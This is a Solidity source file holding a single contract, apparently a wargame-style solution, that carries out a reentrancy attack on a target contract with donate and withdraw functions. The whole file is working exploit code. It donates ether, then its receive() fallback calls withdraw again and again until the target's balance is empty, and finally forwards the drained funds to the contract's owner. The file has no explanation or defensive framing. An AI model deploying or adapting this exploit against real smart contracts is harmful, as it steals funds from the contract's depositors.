pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint256) external;
    function donate(address) external payable;
}

contract ReentranceExploit {
    IReentrance private target;
    address private owner;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = msg.sender;
    }

    function exploit() external payable {
        require(msg.sender == owner, "NOT_OWNER");
        target.donate{value: msg.value}(address(this));
        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 balance = address(target).balance;
        if(balance == 0) {
            (bool ok,) = payable(owner).call{value: address(this).balance}("");
            require(ok, "transfer to owner failed");
        } else if(balance >= msg.value) {
            target.withdraw(msg.value);
        } else {
            target.withdraw(balance);
        }
    }
}
